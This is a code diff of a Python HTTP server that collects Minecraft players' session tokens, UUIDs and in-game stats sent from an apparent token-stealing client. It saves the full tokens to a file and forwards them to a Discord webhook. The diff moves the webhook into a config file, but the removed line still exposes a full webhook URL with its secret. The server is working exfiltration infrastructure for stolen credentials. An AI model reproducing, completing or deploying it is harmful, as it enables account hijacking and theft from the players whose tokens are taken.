@@ -2,8 +2,31 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 import urllib.request
 import urllib.error
+import os
 
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"
+# Load configuration from config.json
+def load_config():
+    try:
+        with open('config.json', 'r') as f:
+            config = json.load(f)
+            return config
+    except FileNotFoundError:
+        print("❌ ERROR: config.json not found!")
+        print("Create config.json with your webhook first!")
+        exit(1)
+    except json.JSONDecodeError:
+        print("❌ ERROR: Invalid config.json!")
+        exit(1)
+
+# Load config
+config = load_config()
+DISCORD_WEBHOOK = config.get('discord_webhook')
+
+if not DISCORD_WEBHOOK:
+    print("❌ ERROR: discord_webhook not found in config.json!")
+    exit(1)
+
+print(f"✅ Config loaded: Webhook length = {len(DISCORD_WEBHOOK)} chars")
 
 class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
@@ -31,7 +54,7 @@ class Handler(BaseHTTPRequestHandler):
                 # Save FULL token to file
                 f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
             
-            # Send to Discord (like the Cloudflare worker)
+            # Send to Discord
             try:
                 headers = {
                     'Content-Type': 'application/json',
@@ -41,14 +64,14 @@ class Handler(BaseHTTPRequestHandler):
                 # Determine if it's a login
                 is_login = log_type.lower() == "login"
                 
-                # Build description (like Cloudflare worker)
+                # Build description
                 description_parts = [
                     f"**Username:** `{username}`",
                     f"**UUID:** `{uuid}`",
                     f"**Server:** `{server}`"
                 ]
                 
-                # Add optional stats if they exist and aren't just "0"
+                # Add optional stats
                 if money and money != "0":
                     description_parts.append(f"**Money:** `{money}`")
                 if playtime and playtime != "0h":
@@ -77,7 +100,7 @@ class Handler(BaseHTTPRequestHandler):
                 elif uuid:
                     embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
                 
-                # Build content message (like Cloudflare worker)
+                # Build content message
                 content = None
                 if is_login:
                     if money and money != "0":
@@ -102,15 +125,12 @@ class Handler(BaseHTTPRequestHandler):
                 
             except urllib.error.HTTPError as e:
                 print(f"❌ Discord HTTP error: {e.code} - {e.reason}")
-                # Read error response for debugging
                 try:
                     error_body = e.read().decode('utf-8')
                     print(f"Error details: {error_body[:500]}")
                     
-                    # If it's a 400 error, check if token is too long
                     if e.code == 400 and len(token) > 4000:
                         print("⚠️ Token might be too long for Discord")
-                        # Try again without the token in the embed
                         embed["description"] = embed["description"].replace(f"\n🔑 **Session Token:**\n||`{token}`||", 
                                                                           "\n🔑 **Session Token:** *(too long for Discord, saved to file)*")
                         payload["embeds"] = [embed]
@@ -146,7 +166,6 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(b'Server running')
     
     def log_message(self, format, *args):
-        # Suppress default HTTP logging
         pass
 
 print("🚀 Server starting on port 5000")
